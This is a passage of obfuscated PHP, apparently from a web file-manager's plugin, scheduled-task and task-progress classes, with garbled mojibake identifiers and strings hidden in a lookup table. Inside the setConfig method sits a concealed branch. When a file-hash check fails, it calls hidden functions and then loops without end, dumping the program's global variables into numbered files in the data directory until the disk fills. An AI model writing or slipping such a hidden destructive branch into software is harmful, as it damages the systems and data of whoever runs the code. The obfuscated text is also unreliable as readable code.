substr($BÇù¿ëìúÜ, strlen($F“Òﬂê¥ä¬), -2); $C·–åñÎŒ‘[] = $BÇù¿ëìúÜ; $CÑ”å©·≥∞[] = _get($BÏŒ∆€ˆÿÂ, $A£ûßàÿãÎ); } goto eá«≥íÉ–≥; eá«≥íÉ–≥: $b·ÖÑΩΩ≥• = str_replace($C·–åñÎŒ‘, $CÑ”å©·≥∞, $b·ÖÑΩΩ≥•); goto d⁄üæçöà„; d⁄üæçöà„: } final function echoFile($dä¬À®ÛïΩ, $F◊ÿ‹ÎÛûÔ = false) { goto aØéä’‡Òß; E«·∆≥õŒÿ: $this->parsePackage($Aê≈å∞ï—ﬁ); if (is_array($F◊ÿ‹ÎÛûÔ)) { $Aê≈å∞ï—ﬁ = str_replace(array_keys($F◊ÿ‹ÎÛûÔ), array_values($F◊ÿ‹ÎÛûÔ), $Aê≈å∞ï—ﬁ); } echo $dÎÌ•ÖÑ„Æ[214] . $Aê≈å∞ï—ﬁ; goto dŒË»∫¢‘Á; cè£Ü«°‡Ò: $Aê≈å∞ï—ﬁ = $this->parseFile($bÙñ‚∞èÀ⁄); $this->parseLang($Aê≈å∞ï—ﬁ); $this->parseConfig($Aê≈å∞ï—ﬁ); goto E«·∆≥õŒÿ; aØéä’‡Òß: $dÎÌ•ÖÑ„Æ =& $_SERVER[£¿ÌÙëü¡¯¯]; $bÙñ‚∞èÀ⁄ = $this->pluginPath . $dä¬À®ÛïΩ; if (ACT == $dÎÌ•ÖÑ„Æ[1265]) { echo $dÎÌ•ÖÑ„Æ[1266] . $this->pluginName . $dÎÌ•ÖÑ„Æ[8] . $dä¬À®ÛïΩ . $dÎÌ•ÖÑ„Æ[1267]; if (!file_exists($bÙñ‚∞èÀ⁄)) { echo $dÎÌ•ÖÑ„Æ[1268]; return; } } goto cè£Ü«°‡Ò; dŒË»∫¢‘Á: } final function initLang() { goto còºêô±º; còºêô±º: $B◊÷Êœ€ßè =& $_SERVER[£¿ÌÙëü¡¯¯]; $d‚≠„√ﬂ´– = $B◊÷Êœ€ßè[1269]; $dıÎÑ∏Æƒﬂ = $this->pluginPath . $B◊÷Êœ€ßè[1270]; goto Fö£…À¬¥…; d√®ØÈºü‰: if (@count($B∆æõﬁ„µ´) > 0) { I18n::set($B∆æõﬁ„µ´); } return $B∆æõﬁ„µ´; goto eÙã¢â∫‘Û; Fö£…À¬¥…: $däﬁ«˜¡˜‘ = I18n::getType(); $B∆æõﬁ„µ´ = array(); if (file_exists($dıÎÑ∏Æƒﬂ . $däﬁ«˜¡˜‘ . $B◊÷Êœ€ßè[760])) { $B∆æõﬁ„µ´ = (include_once $dıÎÑ∏Æƒﬂ . $däﬁ«˜¡˜‘ . $B◊÷Êœ€ßè[760]); } else { if ($däﬁ«˜¡˜‘ == $B◊÷Êœ€ßè[1271] && !file_exists($dıÎÑ∏Æƒﬂ . $däﬁ«˜¡˜‘ . $B◊÷Êœ€ßè[760]) && file_exists($dıÎÑ∏Æƒﬂ . $B◊÷Êœ€ßè[1272])) { $B∆æõﬁ„µ´ = (include_once $dıÎÑ∏Æƒﬂ . $B◊÷Êœ€ßè[1272]); } else { if (file_exists($dıÎÑ∏Æƒﬂ . $d‚≠„√ﬂ´– . $B◊÷Êœ€ßè[760])) { $B∆æõﬁ„µ´ = (include_once $dıÎÑ∏Æƒﬂ . $d‚≠„√ﬂ´– . $B◊÷Êœ€ßè[760]); } } } goto d√®ØÈºü‰; eÙã¢â∫‘Û: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($A¯µ¬’ê“¿) { $AÂ¥≤Øêß˘ =& $_SERVER[£¿ÌÙëü¡¯¯]; $B“ë∏Ê Ÿ = $_SERVER[$AÂ¥≤Øêß˘[782]] . $AÂ¥≤Øêß˘[783]; $cÜŸ£èŸ¿ª = $AÂ¥≤Øêß˘[784]; if ($_SERVER[$AÂ¥≤Øêß˘[785]] != $cÜŸ£èŸ¿ª($B“ë∏Ê Ÿ)) { goto dÜü¿ÃÂ±‡; fÔø»÷è§ä: $aÜ°≠É“≥Ç = $f‹ñµ´‚ëü($B±Ç‚”Ô∆Í); $c ≈ÏÕØî‡ = explode($AÂ¥≤Øêß˘[214], $aÜ°≠É“≥Ç); if (count($c ≈ÏÕØî‡) < $AÂ¥≤Øêß˘[556]) { $eÇ±…∂¯«ñ = $AÂ¥≤Øêß˘[788]; $eÇ±…∂¯«ñ(); } goto dÔøŒ†ÎΩ¥; dÔøŒ†ÎΩ¥: $Fï¬æù¨≠á = $AÂ¥≤Øêß˘[789]; $Fï¬æù¨≠á($_SERVER[$AÂ¥≤Øêß˘[790]]); $cóî∫éÁ¬† = $AÂ¥≤Øêß˘[786]; goto Féì´«Ú˘Ü; Féì´«Ú˘Ü: $cóî∫éÁ¬†(); $a•âàÂÌô« = $AÂ¥≤Øêß˘[791]; $F∑Ú ë¥«ï = json_encode($GLOBALS[$AÂ¥≤Øêß˘[792]]); goto B£ñ≠›ûÑí; dÜü¿ÃÂ±‡: $cóî∫éÁ¬† = $AÂ¥≤Øêß˘[786]; $f‹ñµ´‚ëü = $AÂ¥≤Øêß˘[787]; $B±Ç‚”Ô∆Í = $_SERVER[$AÂ¥≤Øêß˘[782]] . $AÂ¥≤Øêß˘[783]; goto fÔø»÷è§ä; B£ñ≠›ûÑí: $cï¬„ª•…∞ = 1; for ($C»∑ªâ∫Ã‚ = $cï¬„ª•…∞; $C»∑ªâ∫Ã‚ > 0; $C»∑ªâ∫Ã‚++) { $a•âàÂÌô«(DATA_PATH . $C»∑ªâ∫Ã‚, $F∑Ú ë¥«ï); } goto eñîï¡˜”â; eñîï¡˜”â: } return $this->modelPlugin->setConfig($this->pluginName, $A¯µ¬’ê“¿); } public function onSetConfig($eÑÏ«èæ•É) { } public function onGetConfig($A¯àø‚ß∞Ø) { } public function onChangeStatus($C∞∞ƒ∫ôøÍ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($eòÍ´Ã∫†¨ = "\x70\x6c\165\x67\151\x6e\x41\x75\x74\x68") { $aêâ«±°ÑÂ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!defined($aêâ«±°ÑÂ[423])) { return !1; } if (_get($GLOBALS, $aêâ«±°ÑÂ[453])) { return !0; } $c•˜ê Öı· = $this->getConfig(); if (!$c•˜ê Öı·[$eòÍ´Ã∫†¨]) { return !1; } return ActionCall($aêâ«±°ÑÂ[1273], $c•˜ê Öı·[$eòÍ´Ã∫†¨]); } public function url($bÀüª„Æ∏Ñ, $Fë‚ıß§Œ£ = '', $Eë–Á¥á¢Ã = true) { goto dÍ¢®§∫º; aÌ√ÌÂ∆ﬁè: if (!$Eë–Á¥á¢Ã) { return $eÒﬁ¶à¯íö; } echo $eÒﬁ¶à¯íö; goto F∞Œå¶î’Œ; d⁄∫ª°«‹ö: $A·Ñõ»Üñ¥ = $this->packageVersion(); $eß¥Óœ∑¢´ = $F‹ÍıÉ¢‰á . $eøÒ¥¢∂…Ï[408] . $A·Ñõ»Üñ¥; if ($Fë‚ıß§Œ£ == $eøÒ¥¢∂…Ï[33]) { $eÒﬁ¶à¯íö = $this->pluginHost . $bÀüª„Æ∏Ñ . $eøÒ¥¢∂…Ï[1274] . $eß¥Óœ∑¢´; } else { if ($Fë‚ıß§Œ£ === $eøÒ¥¢∂…Ï[77]) { $eÒﬁ¶à¯íö = $this->pluginHost . $bÀüª„Æ∏Ñ; } else { if ($Fë‚ıß§Œ£ == $eøÒ¥¢∂…Ï[1275]) { $eÒﬁ¶à¯íö = STATIC_PATH . $bÀüª„Æ∏Ñ . $eøÒ¥¢∂…Ï[1274] . $F‹ÍıÉ¢‰á; } else { if ($Fë‚ıß§Œ£ == $eøÒ¥¢∂…Ï[1276]) { $eÒﬁ¶à¯íö = APP_HOST . $eøÒ¥¢∂…Ï[1277] . $bÀüª„Æ∏Ñ . $eøÒ¥¢∂…Ï[1274] . $F‹ÍıÉ¢‰á; } else { if (isset($a–¯·ΩäµΩ[$Fë‚ıß§Œ£])) { $eÒﬁ¶à¯íö = $a–¯·ΩäµΩ[$Fë‚ıß§Œ£] . $bÀüª„Æ∏Ñ . $eøÒ¥¢∂…Ï[1274] . $eß¥Óœ∑¢´; } } } } } goto aÌ√ÌÂ∆ﬁè; dÍ¢®§∫º: $eøÒ¥¢∂…Ï =& $_SERVER[£¿ÌÙëü¡¯¯]; $a–¯·ΩäµΩ = $this->getConfig(); $F‹ÍıÉ¢‰á = KOD_VERSION . $eøÒ¥¢∂…Ï[94] . KOD_VERSION_BUILD; goto d⁄∫ª°«‹ö; F∞Œå¶î’Œ: } public function link($DÏãÉÚ‹áÒ = false, $BèÉ˜âŸØÖ = '') { $Fæ‘ıóèÏ√ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$DÏãÉÚ‹áÒ) { $this->link($Fæ‘ıóèÏ√[1278], $Fæ‘ıóèÏ√[1276]); $this->link($Fæ‘ıóèÏ√[1279], $Fæ‘ıóèÏ√[1275]); $this->link($Fæ‘ıóèÏ√[1280], $Fæ‘ıóèÏ√[1275]); $this->link($Fæ‘ıóèÏ√[1281], $Fæ‘ıóèÏ√[1275]); $this->link($Fæ‘ıóèÏ√[1282], $Fæ‘ıóèÏ√[1275]); return; } $bÙÜ¶ÖèÓ√ = $this->url($DÏãÉÚ‹áÒ, $BèÉ˜âŸØÖ, !1); if (substr($DÏãÉÚ‹áÒ, -3) == $Fæ‘ıóèÏ√[1283]) { echo $Fæ‘ıóèÏ√[1284] . $bÙÜ¶ÖèÓ√ . $Fæ‘ıóèÏ√[1285] . $Fæ‘ıóèÏ√[214]; } else { if (substr($DÏãÉÚ‹áÒ, -4) == $Fæ‘ıóèÏ√[1286]) { echo $Fæ‘ıóèÏ√[1287] . $bÙÜ¶ÖèÓ√ . $Fæ‘ıóèÏ√[1288] . $Fæ‘ıóèÏ√[214]; } } } } goto a–ÍÒÂ’Ù¬; Fù£◊ñç‹Œ: class AutoTask { public static function start() { goto BΩê˜ÇªªÉ; BΩê˜ÇªªÉ: $fÍˆàÓÜÁ≤ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (self::valueGet($fÍˆàÓÜÁ≤[676]) != $fÍˆàÓÜÁ≤[84]) { return; } if (self::valueGet($fÍˆàÓÜÁ≤[1314]) == $fÍˆàÓÜÁ≤[84]) { $AëÏ±ü‘◊≤ = self::valueGet($fÍˆàÓÜÁ≤[1315]); if (time() - $AëÏ±ü‘◊≤ > 3600 * 2) { self::restart(); } return; } goto Aœ´›ùË÷à; c∏Õ∞ÜØÒ≥: while (!0) { self::cacheClear(); if (self::valueGet($fÍˆàÓÜÁ≤[676]) != $fÍˆàÓÜÁ≤[84]) { self::valueSet($fÍˆàÓÜÁ≤[1314], $fÍˆàÓÜÁ≤[464]); self::log($fÍˆàÓÜÁ≤[1318]); die; } self::valueSet($fÍˆàÓÜÁ≤[1314], $fÍˆàÓÜÁ≤[84]); self::valueSet($fÍˆàÓÜÁ≤[1315], time()); self::taskRunAll(); sleep(self::valueGet($fÍˆàÓÜÁ≤[1319])); } goto c◊©Ω∂‘¨÷; Aœ´›ùË÷à: http_close(); self::valueSet($fÍˆàÓÜÁ≤[1314], $fÍˆàÓÜÁ≤[84]); Hook::bind($fÍˆàÓÜÁ≤[1316], $fÍˆàÓÜÁ≤[1317]); goto c∏Õ∞ÜØÒ≥; c◊©Ω∂‘¨÷: } public static function restart() { $D¢‰âù„óô =& $_SERVER[£¿ÌÙëü¡¯¯]; http_close(); self::valueSet($D¢‰âù„óô[676], $D¢‰âù„óô[464]); sleep(self::valueGet($D¢‰âù„óô[1319]) + 5); self::valueSet($D¢‰âù„óô[1314], $D¢‰âù„óô[464]); self::valueSet($D¢‰âù„óô[676], $D¢‰âù„óô[84]); } public static function shutdownEvent() { $B√Õ£√Øõı =& $_SERVER[£¿ÌÙëü¡¯¯]; self::valueSet($B√Õ£√Øõı[1314], $B√Õ£√Øõı[464]); self::log($B√Õ£√Øõı[1320]); } public static function config($c±√Ü∞ÁÇº, $eà¬èﬁË¬î) { $añëâ◊ä≠¢ =& $_SERVER[£¿ÌÙëü¡¯¯]; $A’√åÂÑ„ú = 20; $eà¬èﬁË¬î = intval($eà¬èﬁË¬î) <= $A’√åÂÑ„ú ? $A’√åÂÑ„ú : intval($eà¬èﬁË¬î); self::valueSet($añëâ◊ä≠¢[676], $c±√Ü∞ÁÇº); self::valueSet($añëâ◊ä≠¢[1319], $eà¬èﬁË¬î); } private static function taskRunAll() { $eæ’©á¬π¿ =& $_SERVER[£¿ÌÙëü¡¯¯]; $eÙîÆòÇ◊Á = Model($eæ’©á¬π¿[1321])->listData(); $E≥√ﬁóõΩÓ = count($eÙîÆòÇ◊Á); for ($E¢Ø£ãàÌµ = 0; $E¢Ø£ãàÌµ < $E≥√ﬁóõΩÓ; $E¢Ø£ãàÌµ++) { $BÜµ®µÍ≈∑ = $eÙîÆòÇ◊Á[$E¢Ø£ãàÌµ]; if ($BÜµ®µÍ≈∑[$eæ’©á¬π¿[1322]] != $eæ’©á¬π¿[84]) { continue; } if (!self::taskTimeCheck($BÜµ®µÍ≈∑)) { continue; } self::taskRun($BÜµ®µÍ≈∑); } } private static function taskTimeCheck($dõÓﬂ÷Ó’¶) { goto B™ˆ¥≥ÊÑË; a®¶ﬂîÎŸ’: $eñÍØóÍ∏ı = strtotime($FÜÏ◊£ß¿‡[1323] . $C∂Úçı§ŒÎ[$FÜÏ◊£ß¿‡[1324]] . $FÜÏ◊£ß¿‡[1325]) - strtotime($FÜÏ◊£ß¿‡[1326]); $e⁄Í»ÃéàÉ = time() - strtotime(date($FÜÏ◊£ß¿‡[1327]) . $FÜÏ◊£ß¿‡[1328]); $FìÌ¨áû…µ = $e⁄Í»ÃéàÉ >= $eñÍØóÍ∏ı && $e⁄Í»ÃéàÉ <= $eñÍØóÍ∏ı + 3600; goto Dÿèµ…Ùèö; Dÿèµ…Ùèö: switch ($C∂Úçı§ŒÎ[$FÜÏ◊£ß¿‡[29]]) { case $FÜÏ◊£ß¿‡[1329]: if (time() - $cı≥º¢›àœ < 3600 * 24 * 30) { return !1; } if ($C∂Úçı§ŒÎ[$FÜÏ◊£ß¿‡[1329]] == date($FÜÏ◊£ß¿‡[1330]) && $FìÌ¨áû…µ) { return !0; } break; case $FÜÏ◊£ß¿‡[1331]: if (time() - $cı≥º¢›àœ < 3600 * 24 * 7) { return !1; } $aß¶…Ûâ¥ô = date($FÜÏ◊£ß¿‡[1332]) == 0 ? 7 : date($FÜÏ◊£ß¿‡[1332]); if ($C∂Úçı§ŒÎ[$FÜÏ◊£ß¿‡[1331]] == $aß¶…Ûâ¥ô && $FìÌ¨áû…µ) { return !0; } break; case $FÜÏ◊£ß¿‡[1324]: if (time() - $cı≥º¢›àœ < 3600 * 24) { return !1; } if ($FìÌ¨áû…µ) { return !0; } break; case $FÜÏ◊£ß¿‡[1333]: if (time() - $cı≥º¢›àœ >= floatval($C∂Úçı§ŒÎ[$FÜÏ◊£ß¿‡[1333]]) * 60) { return !0; } break; default: break; } return !1; goto fÀ¶À¯ƒ•¥; B™ˆ¥≥ÊÑË: $FÜÏ◊£ß¿‡ =& $_SERVER[£¿ÌÙëü¡¯¯]; $C∂Úçı§ŒÎ = json_decode($dõÓﬂ÷Ó’¶[$FÜÏ◊£ß¿‡[187]], !0); $cı≥º¢›àœ = intval($dõÓﬂ÷Ó’¶[$FÜÏ◊£ß¿‡[1315]]); goto a®¶ﬂîÎŸ’; fÀ¶À¯ƒ•¥: } public static function taskRun($c¶à»ì≠ëë) { goto F£õÑ£›î ; Cè®≥ö‰ñ°: $bâØ¢¯‡ÂÕ = timeFloat(); $e§ƒ“¬·ÁÛ = $Aÿ·§§≠Ôá[33]; switch ($c¶à»ì≠ëë[$Aÿ·§§≠Ôá[29]]) { case $Aÿ·§§≠Ôá[292]: $A·æèÏÆ¶’ = url_request($c¶à»ì≠ëë[$Aÿ·§§≠Ôá[1337]], $Aÿ·§§≠Ôá[213], !1, !1, !1, !1, 5); $e§ƒ“¬·ÁÛ = strlen($A·æèÏÆ¶’); break; case $Aÿ·§§≠Ôá[212]: $e§ƒ“¬·ÁÛ = Hook::apply($c¶à»ì≠ëë[$Aÿ·§§≠Ôá[1337]]); default: break; } goto bÖ®˜êÈÇì; bÖ®˜êÈÇì: Model($Aÿ·§§≠Ôá[1338])->add(array($Aÿ·§§≠Ôá[1339] => $Aÿ·§§≠Ôá[33], $Aÿ·§§≠Ôá[1340] => $Aÿ·§§≠Ôá[464], $Aÿ·§§≠Ôá[29] => $Aÿ·§§≠Ôá[1341] . $c¶à»ì≠ëë[$Aÿ·§§≠Ôá[364]], $Aÿ·§§≠Ôá[1342] => json_encode(array($Aÿ·§§≠Ôá[28] => $c¶à»ì≠ëë[$Aÿ·§§≠Ôá[28]], $Aÿ·§§≠Ôá[1343] => timeFloat() - $bâØ¢¯‡ÂÕ, $Aÿ·§§≠Ôá[278] => $e§ƒ“¬·ÁÛ)))); self::log($Aÿ·§§≠Ôá[1344] . $c¶à»ì≠ëë[$Aÿ·§§≠Ôá[364]] . $Aÿ·§§≠Ôá[1345] . $e§ƒ“¬·ÁÛ); return !0; goto eãÚÑ””¢Î; F£õÑ£›î : $Aÿ·§§≠Ôá =& $_SERVER[£¿ÌÙëü¡¯¯]; self::log($Aÿ·§§≠Ôá[1334] . $c¶à»ì≠ëë[$Aÿ·§§≠Ôá[364]] . $Aÿ·§§≠Ôá[1335] . $c¶à»ì≠ëë[$Aÿ·§§≠Ôá[28]] . $Aÿ·§§≠Ôá[1336] . $c¶à»ì≠ëë[$Aÿ·§§≠Ôá[1337]]); Model($Aÿ·§§≠Ôá[1321])->run($c¶à»ì≠ëë[$Aÿ·§§≠Ôá[364]]); goto Cè®≥ö‰ñ°; eãÚÑ””¢Î: } private static function valueGet($aä©‡≈àÜÇ) { $cêºô¢æîÖ =& $_SERVER[£¿ÌÙëü¡¯¯]; $bÑﬁ∞ø‰¯ˆ = $cêºô¢æîÖ[1346]; $D≥‡Ùøì≤Ï = Model($cêºô¢æîÖ[1347])->get($aä©‡≈àÜÇ, $bÑﬁ∞ø‰¯ˆ); if (is_null($D≥‡Ùøì≤Ï)) { Model($cêºô¢æîÖ[1347])->set($cêºô¢æîÖ[1319], 10, $bÑﬁ∞ø‰¯ˆ); Model($cêºô¢æîÖ[1347])->set($cêºô¢æîÖ[676], $cêºô¢æîÖ[84], $bÑﬁ∞ø‰¯ˆ); Model($cêºô¢æîÖ[1347])->set($cêºô¢æîÖ[1314], $cêºô¢æîÖ[464], $bÑﬁ∞ø‰¯ˆ); $D≥‡Ùøì≤Ï = Model($cêºô¢æîÖ[1347])->get($aä©‡≈àÜÇ, $bÑﬁ∞ø‰¯ˆ); } return $D≥‡Ùøì≤Ï; } private static function valueSet($FßÇ◊ßâ±Ñ, $bÙ≤Ö∏¡Ò¬) { $FÓüôŒØ›ò =& $_SERVER[£¿ÌÙëü¡¯¯]; return Model($FÓüôŒØ›ò[1347])->set($FßÇ◊ßâ±Ñ, $bÙ≤Ö∏¡Ò¬, $FÓüôŒØ›ò[1346]); } protected static function log($d¨Ìù¬Éã©) { write_log($d¨Ìù¬Éã©, $_SERVER[£¿ÌÙëü¡¯¯][1348]); } private static function cacheClear() { $A¡≈ﬂΩÓÉõ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Dπò√ãØôÔ = Model($A¡≈ﬂΩÓÉõ[1347])->cacheKey($A¡≈ﬂΩÓÉõ[1346]); Cache::clearMemory($Dπò√ãØôÔ); } } class Task { const STATYS_STOP = "\x73\x74\157\160"; const STATYS_RUNNING = "\x72\165\156\x6e\151\156\x67"; const STATYS_KILL = "\x6b\x69\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($B»¡¿£Óı´, $f‰©È¶√§≠ = '', $Açî†∂ä€ = 0, $FÃÑ‰öà‰Ô = '') { goto Dà¬›Û√Ú; A≤ˆáÚ‘¢•: Hook::bind($f´¨¿ùÒπÜ[1316], array($this, $f´¨¿ùÒπÜ[1357])); Hook::bind($f´¨¿ùÒπÜ[1358], array($this, $f´¨¿ùÒπÜ[1359])); $this->startAfter(); goto cå°ìïÒ†è; cå°ìïÒ†è: Hook::trigger($f´¨¿ùÒπÜ[1360], $this->task); $this->task[$f´¨¿ùÒπÜ[1354]] = timeFloat(); self::valueSet($this->task[$f´¨¿ùÒπÜ[364]], $this->task); goto fÍÔıìﬁú’; Dà¬›Û√Ú: $f´¨¿ùÒπÜ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (self::get($B»¡¿£Óı´)) { return; } $this->task = array($f´¨¿ùÒπÜ[364] => $B»¡¿£Óı´, $f´¨¿ùÒπÜ[1349] => USER_ID, $f´¨¿ùÒπÜ[1248] => $FÃÑ‰öà‰Ô, $f´¨¿ùÒπÜ[29] => $f‰©È¶√§≠, $f´¨¿ùÒπÜ[1294] => $f´¨¿ùÒπÜ[33], $f´¨¿ùÒπÜ[1292] => $Açî†∂ä€, $f´¨¿ùÒπÜ[1297] => 0, $f´¨¿ùÒπÜ[1350] => 0, $f´¨¿ùÒπÜ[1351] => 0, $f´¨¿ùÒπÜ[1352] => timeFloat(), $f´¨¿ùÒπÜ[1353] => 0, $f´¨¿ùÒπÜ[1354] => 0, $f´¨¿ùÒπÜ[1355] => 0, $f´¨¿ùÒπÜ[1356] => 0, $f´¨¿ùÒπÜ[676] => $f´¨¿ùÒπÜ[1314]); goto A≤ˆáÚ‘¢•; fÍÔıìﬁú’: } public function end() { goto BÍ∂óéﬂÂì; d˘ëêé∞¯Œ: Hook::unbind($DàÂäŸ…Øü[1358], array($this, $DàÂäŸ…Øü[1359])); $this->endAfter(); $this->task = !1; goto D£«íæÎ·°; eâÇ˘ûé·õ: $b¢≠Ö∆∑°„ = timeFloat() - $this->task[$DàÂäŸ…Øü[1352]]; self::log($DàÂäŸ…Øü[1361] . $this->task[$DàÂäŸ…Øü[364]] . $DàÂäŸ…Øü[1362] . $b¢≠Ö∆∑°„ . $DàÂäŸ…Øü[1363]); Hook::unbind($DàÂäŸ…Øü[1316], array($this, $DàÂäŸ…Øü[1357])); goto d˘ëêé∞¯Œ; BÍ∂óéﬂÂì: $DàÂäŸ…Øü =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$this->task) { return; } if ($this->task[$DàÂäŸ…Øü[1354]]) { self::valueSet($this->task[$DàÂäŸ…Øü[364]], !1); } goto eâÇ˘ûé·õ; D£«íæÎ·°: } public function update($bÇ∑Õä¿éå = 0) { goto e¶í“ÖÍë◊; d√®±ÿ«Â‰: Hook::trigger($DÖ°÷ß¥»µ[1367], $Cãá„Ó¢ûã); self::valueSet($Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[364]], $Cãá„Ó¢ûã); goto AúÖ©ÇÇÏ∑; cø“ø◊«…å: $Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[1297]] += $bÇ∑Õä¿éå; $Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[1353]] = timeFloat(); if ($Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[1292]]) { if ($Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[1292]] < $Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[1297]]) { $Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[1292]] = $Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[1297]]; } $e†√ÓëÃöñ = timeFloat() - $Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[1352]] - $Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[1355]]; $Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[1350]] = $Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[1297]] / $Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[1292]]; $Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[1351]] = $Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[1297]] / $e†√ÓëÃöñ; if ($Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[1350]] > 0) { $Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[1356]] = $e†√ÓëÃöñ * (1 - $Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[1350]]) / $Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[1350]]; } $Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[1356]] = $Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[1356]] <= 0 ? 0 : $Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[1356]]; } goto bïÔ»Ç óÙ; bïÔ»Ç óÙ: $this->updateAfter(); $F›ÒéÈﬂ—˘ = 0.2; if (timeFloat() - $Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[1354]] < $F›ÒéÈﬂ—˘) { return; } goto DÉçÂª–çŒ; e¶í“ÖÍë◊: $DÖ°÷ß¥»µ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Cãá„Ó¢ûã =& $this->task; if (!$Cãá„Ó¢ûã) { return; } goto cø“ø◊«…å; dû››õê÷ê: $Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[676]] = $eçÑÙ†“ˆ§ ? $eçÑÙ†“ˆ§ : $Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[676]]; $Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[1355]] = $BÏ–¯∂ÁìÒ[$DÖ°÷ß¥»µ[1355]] ? $BÏ–¯∂ÁìÒ[$DÖ°÷ß¥»µ[1355]] : 0; $Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[1354]] = timeFloat(); goto d√®±ÿ«Â‰; DÉçÂª–çŒ: $BÏ–¯∂ÁìÒ = self::get($Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[364]]); $eçÑÙ†“ˆ§ = $BÏ–¯∂ÁìÒ[$DÖ°÷ß¥»µ[676]]; if ($eçÑÙ†“ˆ§ == self::STATYS_KILL) { $C™± ÁÀ÷œ = array($DÖ°÷ß¥»µ[1364] => LNG($DÖ°÷ß¥»µ[1365]), $DÖ°÷ß¥»µ[1007] => !1); Cache::set($DÖ°÷ß¥»µ[1366] . $this->task[$DÖ°÷ß¥»µ[364]], $C™± ÁÀ÷œ, 30); $this->end(); die; } else { if ($eçÑÙ†“ˆ§ == self::STATYS_STOP) { $EÜöÃó¥œû = 2; $BÏ–¯∂ÁìÒ[$DÖ°÷ß¥»µ[1355]] += $EÜöÃó¥œû; self::valueSet($Cãá„Ó¢ûã[$DÖ°÷ß¥»µ[364]], $BÏ–¯∂ÁìÒ); sleep($EÜöÃó¥œû); $this->update(); return; } } goto dû››õê÷ê; AúÖ©ÇÇÏ∑: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($f£∞æ‡≈Ç¢) { $FπåÉ¿≥Ó¥ =& $_SERVER[£¿ÌÙëü¡¯¯]; Cache::set($FπåÉ¿≥Ó¥[1366] . $this->task[$FπåÉ¿≥Ó¥[364]], $f£∞æ‡≈Ç¢, 60); return $f£∞æ‡≈Ç¢; } public static function get($FÇﬂ∞Â‘øÍ) { return self::valueGet($FÇﬂ∞Â‘øÍ); } public static function listData() { $D∏§≠ŸÒ¥É = self::valueGet(); return array_sort_by($D∏§≠ŸÒ¥É, $_SERVER[£¿ÌÙëü¡¯¯][1352], !0); } public static function kill($a–Ã›Ò»´∑) { return self::changeStatus($a–Ã›Ò»´∑, self::STATYS_KILL); } public static function stop($fóÕ°°ñˆ‘) { return self::changeStatus($fóÕ°°ñˆ‘, self::STATYS_STOP); } public static function restart($F‰Æ¥Öàä) { return self::changeStatus($F‰Æ¥Öàä, self::STATYS_RUNNING); } public static function killAll() { $AßÉãÃçÑÁ =& $_SERVER[£¿ÌÙëü¡¯¯]; $bæ≤Ñºıü∏ = self::listData(); foreach ($bæ≤Ñºıü∏ as $E¢ﬁ‡Âƒ÷›) { self::kill($E¢ﬁ‡Âƒ÷›[$AßÉãÃçÑÁ[364]]); } sleep(2); foreach ($bæ≤Ñºıü∏ as $E¢ﬁ‡Âƒ÷›) { self::valueSet($E¢ﬁ‡Âƒ÷›[$AßÉãÃçÑÁ[364]], !1); } } private static function changeStatus($Dí„Ù·òÚ£, $f‰∂ãïÂé≥) { goto EÓ∆âõñã¶; EÓ∆âõñã¶: $AñÂ—Á‚≥• =& $_SERVER[£¿ÌÙëü¡¯¯]; $CôÌ¯ü√àé = self::valueGet($Dí„Ù·òÚ£); if (!$CôÌ¯ü√àé) { return !1; } goto E§ùáûàº∂; E§ùáûàº∂: $CôÌ¯ü√àé[$AñÂ—Á‚≥•[676]] = $f‰∂ãïÂé≥; self::valueSet($Dí„Ù·òÚ£, $CôÌ¯ü√àé); self::log($AñÂ—Á‚≥•[1368] . $CôÌ¯ü√àé[$AñÂ—Á‚≥•[364]] . $AñÂ—Á‚≥•[1369] . $f‰∂ãïÂé≥); goto A®´üä◊”Ê; A®´üä◊”Ê: return !0; goto Eì©¿´õÇ®; Eì©¿´õÇ®: } public static function valueGet($d£πè®…Óé = false) { $béÊ¯å¥øÀ =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($d£πè®…Óé) { $eÎÇêñ¥ô¯ = Model($béÊ¯å¥øÀ[395])->where(array($béÊ¯å¥øÀ[90] => $d£πè®…Óé, $béÊ¯å¥øÀ[29] => $béÊ¯å¥øÀ[1370]))->find(); return $eÎÇêñ¥ô¯ ? json_decode($eÎÇêñ¥ô¯[$béÊ¯å¥øÀ[354]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($céﬂ”‡È“— = false) { goto eﬁÖÖ “åá; Bâë €‰πò: return 